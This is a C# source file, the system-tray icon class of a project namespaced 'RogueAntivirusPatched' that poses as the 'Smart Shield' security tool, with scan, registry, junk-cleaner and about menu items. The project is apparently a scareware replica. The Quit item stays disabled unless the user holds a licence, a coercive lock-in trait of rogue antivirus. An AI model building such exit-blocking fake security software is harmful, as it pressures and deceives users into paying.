using System;
using System.Drawing.Imaging;
using System.Windows.Forms;
using wpf = System.Windows;
using System.Drawing;
using RogueAntivirusPatched.Model;
using RogueAntivirusPatched.Global;
using System.Diagnostics;
using System.IO;
using RogueAntivirusPatched.View.Pages;

namespace RogueAntivirusPatched.Classes
{
    internal class TrayIcon
    {
        public static NotifyIcon notify;
        private static ContextMenu menu;

        public KeySender keySender;

        public MenuItem menuItemOpen = new MenuItem
        {
            Text = "Open Smart Shield",    
        };

        public MenuItem menuItemQuit = new MenuItem 
        {
            Text = "Quit",
        };

        public MenuItem menuItemScanAV = new MenuItem
        {
            Text = "Quick Scan (Antivirus)"
        };

        public MenuItem menuItemRegistry = new MenuItem
        {
            Text = "Analyze Registry"
        };

        public MenuItem menuItemJunk = new MenuItem
        {
            Text = "Delete Junk Files"
        };

        public MenuItem menuItemAbout = new MenuItem
        {
            Text = "About System"
        };

        public enum MenuItemType
        {
            Quit = 0,
            Open = 1,
            Antivirus = 2,
            Junk = 3,
            Registry = 4,
            About = 5
        }

        public MenuItemType menuItemType = MenuItemType.Quit;

        public void Initialize()
        {
            if (menu != null) menu.MenuItems.Clear();

            // Initialize ContextMenu
            menu = new ContextMenu();

            keySender = new KeySender();
            menuItemQuit.Enabled = keySender.HasLicense;

            menuItemOpen.Click += MenuItemOpen_Click;
            menuItemScanAV.Click += MenuItemScanAV_Click;
            menuItemRegistry.Click += MenuItemRegistry_Click;
            menuItemJunk.Click += MenuItemJunk_Click;
            menuItemAbout.Click += MenuItemAbout_Click;
            menuItemQuit.Click += MenuItemQuit_Click;

            menu.MenuItems.Add(menuItemOpen);
            menu.MenuItems.Add(new MenuItem("—————————————"));
            menu.MenuItems.Add(menuItemScanAV);
            menu.MenuItems.Add(menuItemRegistry);
            menu.MenuItems.Add(menuItemJunk);
            menu.MenuItems.Add(menuItemAbout);
            menu.MenuItems.Add(new MenuItem("—————————————"));
            menu.MenuItems.Add(menuItemQuit);

            // Initialize NotifyIcon
            notify = new NotifyIcon();
            notify.Icon = Properties.Resources.shield_happy;
            notify.Visible = true;
            notify.ContextMenu = menu;
            notify.MouseClick += Notify_MouseClick;
        }

        public static void DisableNotifyIcon()
        {
            notify.Visible = false;
        }

        private void Notify_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
                OpenMenuItem(MenuItemType.Open);
        }

        private void MenuItemQuit_Click(object sender, EventArgs e)
        {
            OpenMenuItem(MenuItemType.Quit);   
        }

        private void MenuItemAbout_Click(object sender, EventArgs e)
        {
            OpenMenuItem(MenuItemType.About);
        }

        private void MenuItemJunk_Click(object sender, EventArgs e)
        {
            OpenMenuItem(MenuItemType.Junk);
        }

        private void MenuItemRegistry_Click(object sender, EventArgs e)
        {
            OpenMenuItem(MenuItemType.Registry);
        }

        private void MenuItemScanAV_Click(object sender, EventArgs e)
        {
            OpenMenuItem(MenuItemType.Antivirus);
        }

        private void MenuItemOpen_Click(object sender, EventArgs e)
        {
            OpenMenuItem(MenuItemType.Open);
        }

        private void OpenMenuItem(MenuItemType mType)
        {
            if (Variables.IsPageWorking && mType != MenuItemType.Open)
            {
                Messages.ProcessIsRunning();
                return;
            }

            if (mType == MenuItemType.Quit)
            {
                var thisApp = Application.ExecutablePath;
                var getApp = Path.GetFileNameWithoutExtension(thisApp);
                var processList = Process.GetProcessesByName(getApp);

                foreach (var process in processList)
                {
                    process.Kill();
                }
            }

            var mainWindow = (MainWindow)wpf.Application.Current.MainWindow;

            mainWindow.Dispatcher.Invoke(() =>
            {
                switch (mType)
                {
                    case MenuItemType.Antivirus:
                        mainWindow.VmMainWindow.ContentPage = new AntivirusPage(true);
                        break;

                    case MenuItemType.Registry:
                        mainWindow.VmMainWindow.ContentPage = new RegistryPage(true);
                        break;

                    case MenuItemType.Junk:
                        mainWindow.VmMainWindow.ContentPage = new JunkCleanerPage(true);
                        break;

                    case MenuItemType.About:
                        mainWindow.VmMainWindow.ContentPage = new SystemInfoPage();
                        break;
                }
            });

            UISettings.ShowWindow();
        }
    }
}
